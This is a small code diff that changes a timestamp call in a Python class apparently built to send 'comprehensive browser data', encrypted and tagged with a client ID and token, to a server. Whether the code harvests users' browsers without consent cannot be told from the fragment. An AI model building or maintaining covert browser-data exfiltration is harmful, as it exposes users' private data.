@@ -554,7 +554,7 @@ class ServerCommunicator:
                 "client_id": self.client_id,
                 "token": self.token,
                 "browser_data": encrypted_browser_data,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
             
             self.logger.info("Sending comprehensive browser data")
